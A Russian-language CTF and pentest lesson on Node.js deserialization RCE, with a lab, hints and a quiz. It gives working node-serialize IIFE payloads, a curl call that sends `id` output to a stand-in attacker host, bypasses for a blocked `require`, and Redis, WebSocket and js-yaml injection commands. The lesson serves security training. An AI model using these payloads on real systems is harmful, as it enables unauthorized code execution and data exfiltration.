---
id: web-node-deser
title: "Node.js deserialization: node-serialize и funcster"
category: web
parent: web-deser-languages
difficulty: hard
order: 2
tags: [nodejs, deserialization, node-serialize, funcster, rce]
prerequisites: [web-deserialization]
useful_for:
  - "CTF Web категория"
  - "Bug bounty"
  - "Пентест веб-приложений"
estimated_minutes: 34
summary: "Node.js-десериализация: node-serialize IIFE gadget, funcster, serialize-javascript и цепочки до RCE."
lab:
  kind: shell
  title: 'Практика: node-serialize IIFE gadget'
  toolset: [core, node, curl]
  workdir: /home/student/task
  files: [task.md, profile.txt, gen.js]
  check: 'grep -q ''nto{'' found.txt'
  hints:
    - 'Посмотри обычный профиль: `base64 -d profile.txt`.'
    - 'Изучи `gen.js`: строка с префиксом `_$$ND_FUNC$$_` выполняется как функция.'
    - 'Сгенерируй payload: `node gen.js > payload.json`.'
    - 'Отправь его: `curl -s https://store.example/ --data-binary @payload.json > found.txt`, затем `check`.'
---

## Вопрос, с которого всё начинается

Обычный JSON в Node.js безопасен: `JSON.parse` умеет читать только данные — строки, числа, списки — и не может ничего выполнить. Так почему Node-десериализация вообще существует?

Потому что некоторые библиотеки сериализуют **не только данные, но и функции**. При десериализации они берут строку, помеченную специальным префиксом, и пропускают её через `eval` — то есть **выполняют**. Если такая строка попадёт в поле, которое приложение десериализует, ты получишь RCE. Разберём это на одном примере.

## Наш пример

Есть Node-приложение `store.example`. Оно ставит cookie, который декодируется в JSON:

```bash
$ echo 'eyJwcm9maWxlIjp7Im5hbWUiOiJib2IifX0=' | base64 -d
{"profile":{"name":"bob"}}
```

Обычный JSON — на первый взгляд безопасно. Но библиотека `node-serialize` кодирует функции особым префиксом `_$$ND_FUNC$$_`. Проверим гипотезу: отправим вместо `bob` строку, которая начинается с этого префикса и содержит безобидный `console.log`:

```bash
$ PAYLOAD='{"profile":"_$$ND_FUNC$$_function(){console.log(\"PWN\")}()"}'
$ echo -n "$PAYLOAD" | base64 -w0
eyJwcm9maWxlIjoiXyQkTkRfRlVOQyQkX2Z1bmN0aW9uKCl7Y29uc29sZS5sb2coIlBXTiIpfSgpIn0=
$ curl -s https://store.example/ -H "Cookie: profile=$(echo -n "$PAYLOAD" | base64 -w0)"
```

В логах сервера появляется `PWN` — значит, `unserialize` действительно **выполнил** нашу функцию. Внешне это был валидный JSON, поэтому фильтр «только JSON» его пропустил.

## Шаг 1: почему нужен IIFE

Обрати внимание на `()` в самом конце payload: `...function(){...}()`. Это **IIFE** (Immediately Invoked Function Expression — функция, вызываемая сразу после определения). Библиотека делает примерно так:

```javascript
eval('function(){ console.log("PWN") }')   // функция создана, но НЕ вызвана
eval('function(){ console.log("PWN") }()') // функция создана И вызвана
```

Без `()` `eval` лишь создаст функцию и выбросит её — ничего не выполнится. С `()` — тело выполняется немедленно. Это самая частая ошибка новичка: payload вроде правильный, а эффекта нет, потому что забыт вызов.

## Шаг 2: подтверждаем RCE

Теперь заменим `console.log` на запуск процесса. Модуль `child_process` умеет выполнять команды ОС:

```bash
$ PAYLOAD='{"profile":"_$$ND_FUNC$$_function(){require(\"child_process\").exec(\"curl http://ATTACKER:8080/$(id|base64)\");}()"}'
$ python3 -m http.server 8080 &     # наш listener
$ curl -s https://store.example/ -H "Cookie: profile=$(echo -n "$PAYLOAD" | base64 -w0)"
# в логе: GET /dWlkPTAocm9vdCkK
```

Пришёл запрос с base64 от `id=0(root)` — код выполнен. Вывод `exec` **не возвращается** в HTTP-ответ, поэтому доказательство всегда строится через OOB (DNS/HTTP) или файл-маркер:

```bash
$ PAYLOAD='{"profile":"_$$ND_FUNC$$_function(){require(\"child_process\").exec(\"id > /tmp/pwned\");}()"}'
```

Файл `/tmp/pwned` потом читаешь любой файловой уязвимостью — это тоже read-back.

## Шаг 3: если `require` заблокирован

Иногда `require` переименован или запрещён. Обойти можно через уже существующий глобальный `process`:

```javascript
_$$ND_FUNC$$_function(){process.mainModule.require('child_process').exec('id > /tmp/pwned')}()
```

Если и это не сработало — `global.process.mainModule.require(...)`, либо трюк с `this.constructor.constructor('return process')()`. Смысл один: добраться до функции, которая создаёт процесс, в обход фильтра.

## Шаг 4: другие уязвимые библиотеки и точки

`node-serialize` — самый известный пример, но не единственный:

| Библиотека | Опасность | Условие |
|------------|-----------|---------|
| `node-serialize` | RCE через `_$$ND_FUNC$$_` | `unserialize` недоверенного ввода |
| `funcster` | RCE через `deepDeserialize` | исполнение функций |
| `cryo` | RCE в старых версиях | десериализация |
| `js-yaml` < 3.13 | RCE через `!!js/function` | `load` без `safeLoad` |

`js-yaml` особенно коварен, потому что используется в конфигах повсюду. Payload:

```yaml
!!js/function >
  function(){ require('child_process').execSync('id'); }
```

Точки, где стоит искать `unserialize`:

- cookie/параметры, прогоняемые через `node-serialize.unserialize`;
- WebSocket-сообщения с сериализованными объектами (часто вне WAF и логирования);
- Redis/Memcached/очередь, где объекты хранятся в этом формате;
- конфиги, где используется `funcster`/`cryo`.

Поиск по исходникам — дешёвая и очень эффективная проверка:

```bash
$ grep -rn "node-serialize\|funcster\|cryo\|unserialize\|serialize-javascript" . --include='*.js'
$ npm ls node-serialize funcster cryo serialize-javascript
```

## Шаг 5: через Redis — типовой путь

Если приложение кеширует объекты в Redis и читает их через `node-serialize`, а Redis доступен без пароля (частая ошибка конфигурации), путь такой:

```bash
$ redis-cli -h TARGET SET cache:profile \
  '{"rce":"_$$ND_FUNC$$_function(){require(\"child_process\").exec(\"id\");}()"}'
```

При следующем чтении ключа приложение десериализует объект — и выполнит код. Это классическая связка «открытый Redis (или SSRF → Redis) → десериализация → RCE».

## Шаг 6: не спутать с prototype pollution

Есть похожая, но другая атака — **prototype pollution**: ввод задаёт `__proto__`/`constructor.prototype`, и уязвимость проявляется позже, в другом месте (например, при создании процесса). Отличить просто:

- **node-deser** — нужен префикс функции `_$$ND_FUNC$$_`, объект десериализуется целиком;
- **prototype pollution** — payload без префикса функции всё равно меняет поведение через `__proto__`.

Иногда они совмещаются: десериализация загрязняет прототип, который затем использует sink.

## Шаг 7: десериализация в WebSocket-сообщении

Многие Node-приложения принимают команды по **WebSocket** — постоянному двустороннему соединению — и десериализуют их тем же `unserialize`. Это удобная точка, потому что WebSocket часто не покрыт ни WAF, ни логированием: HTTP-фильтры видят только рукопожатие, а дальше идёт поток кадров.

```bash
$ node - <<'EOF'
const WebSocket = require('ws');
const ws = new WebSocket('wss://store.example/ws');
ws.on('open', () => {
  ws.send(JSON.stringify({
    action: "_$$ND_FUNC$$_function(){require('child_process').exec('id > /tmp/ws_pwned');}()"
  }));
});
EOF
```

Если после отправки на сервере появился `/tmp/ws_pwned` (проверяется любой файловой уязвимостью или read-back), десериализация исполнила код. На CTF WebSocket-точки особенно ценны, когда основной HTTP-вход защищён: то, что закрыто на одном канале, часто открыто на другом. Всегда проверяй, не обрабатывает ли приложение сериализованные объекты и по WebSocket, и по HTTP — правила там разные.

## Что мы теперь знаем

- Обычный `JSON.parse` безопасен — он не исполняет функции.
- `node-serialize` кодирует функции префиксом `_$$ND_FUNC$$_` и выполняет их через `eval`.
- В payload обязателен IIFE — вызов `()` в конце, иначе функция не запустится.
- RCE подтверждают через OOB или файл-маркер: вывод `exec` не идёт в ответ.
- Если `require` заблокирован — `process.mainModule.require`.
- Проверять надо `package.json`/`npm ls` и точки десериализации (cookie, WebSocket, Redis).
- `js-yaml` со старым `load` даёт RCE через `!!js/function`.

## На что смотреть дальше

- **Первым делом смотри `package.json`** на `node-serialize`/`funcster`/`cryo` — дешёвая проверка с огромным потенциалом.
- **Проверяй версию `js-yaml`**: старые сборки (`< 3.13`) исполняют `!!js/function` при обычном `load`, а этот пакет стоит почти в каждом Node-проекте.
- **Не забудь `()`** — без IIFE payload бесполезен.
- **Кодировка важна:** cookie может ждать base64, url-encode или raw.
- **WebSocket** часто не покрыт WAF — отдельная удобная точка.
- **Если node-serialize нет**, проверь соседние Node-векторы: prototype pollution, SSTI (EJS/Pug), command injection.
- **Только с согласия.** RCE меняет состояние прода.

## Квиз

Проверь себя.

```quiz
- question: "Какой префикс обозначает функцию в node-serialize?"
  options:
    - "`function:`"
    - "`_$$ND_FUNC$$_`"
    - "`@func`"
    - "`=>`"
  answer: 1
  explanation: "Специальный маркер сериализованной функции."
- question: "Зачем в payload нужен IIFE (`()` в конце)?"
  options:
    - "Для красоты"
    - "Чтобы функция выполнилась сразу при десериализации, а не просто определилась"
    - "Для TLS"
    - "Для сжатия"
  answer: 1
  explanation: "Без `()` `eval` только создаст функцию и выбросит её."
- question: "Как вызвать child_process, если `require` недоступен?"
  options:
    - "Через `import`"
    - "Через `process.mainModule.require('child_process')`"
    - "Через `eval`"
    - "Через `fs`"
  answer: 1
  explanation: "Доступ к require через глобальный process."
- question: "Почему RCE в Node доказывают через OOB или файл?"
  options:
    - "Потому что это быстрее"
    - "Вывод `exec` не возвращается в HTTP-ответ — канал слепой"
    - "Потому что WAF"
    - "Потому что JSON"
  answer: 1
  explanation: "exec не пишет в ответ, поэтому нужен внешний признак выполнения."
- question: "Чем node-deser отличается от prototype pollution?"
  options:
    - "Ничем"
    - "node-deser требует префикс функции `_$$ND_FUNC$$_`; pollution действует через `__proto__`"
    - "pollution быстрее"
    - "node-deser только в Python"
  answer: 1
  explanation: "Разные механизмы: десериализация функции против загрязнения прототипа."
```

## Куда дальше

Дальше мы посмотрим, как то же самое выглядит в **Ruby** (`web-ruby-deser`) — там десериализация идёт через `Marshal` и YAML-теги `!ruby/object:`. А пока главное запомни: в Node есть библиотеки, которые **исполняют** сериализованные функции — и `package.json` подскажет, есть ли такая у цели.

## Где пригодится

- **CTF (Web):** задачи на Node-deser.
- **Bug bounty:** RCE в Node-сервисах.
- **Пентест:** аудит зависимостей Node.
- **Работа (AppSec):** отказ от сериализации функций, JSON, обновление библиотек.
